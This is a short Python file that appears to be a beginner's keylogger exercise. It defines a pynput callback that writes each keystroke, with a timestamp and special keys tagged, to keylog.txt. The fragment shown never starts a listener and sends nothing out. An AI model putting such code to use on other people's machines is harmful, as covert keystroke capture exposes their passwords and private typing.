from pynput import keyboard
from datetime import datetime

def when_pressed(key): #This function is called everytime a key is pressed. Key is taken as an argument.
    try:
        char = key.char 
    except AttributeError: #pynput library has Key objects for special keys like space, shift, ctrl, etc. 
        if key == keyboard.Key.space:
            char = " " 
        elif key == keyboard.Key.enter:
            char = "\n"
        else:
            char = f"[{key.name}]" # Format special keys like [SHIFT], [CTRL], etc.

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Get current time in the format "YYYY-MM-DD HH:MM:SS" it will log the keystroke with the timestamp.
    try: 
        with open("keylog.txt" , "a", encoding="utf-8") as file: 
            file.write(f"{timestamp} : {char}\n") # Write the keystroke to the file. 'with' keyword it releases the memory automatically
    except Exception as e:
        print(f"Error: {e}")    
